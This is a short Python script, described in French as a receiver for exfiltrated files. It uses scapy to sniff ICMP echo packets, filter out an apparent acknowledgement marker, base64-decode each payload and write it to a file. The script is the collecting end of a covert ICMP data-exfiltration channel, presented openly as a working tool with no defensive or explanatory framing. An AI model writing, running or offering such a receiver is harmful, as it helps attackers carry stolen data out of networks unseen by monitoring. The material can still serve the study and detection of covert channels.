import base64
import argparse
from scapy.all import *
parser = argparse.ArgumentParser(description="reception de fichiers exfiltrés")
parser.add_argument('-f','--file', help='nom du fichier à recevoir',dest='file',type=str)

args = parser.parse_args()
fichier=args.file
if not args.file:
    parser.print_help()
    exit(1)
filename = args.file
with open(args.file, "wb") as f:
  while True:
      packet=sniff(filter="icmp[icmptype]==icmp-echo and ! icmp[8:4]==0x636f6b3f ",count=1)
      b64_payload = packet[0][Raw].load
      bytes_read = base64.b64decode(b64_payload)
      if not bytes_read:
          break
      f.write(bytes_read)
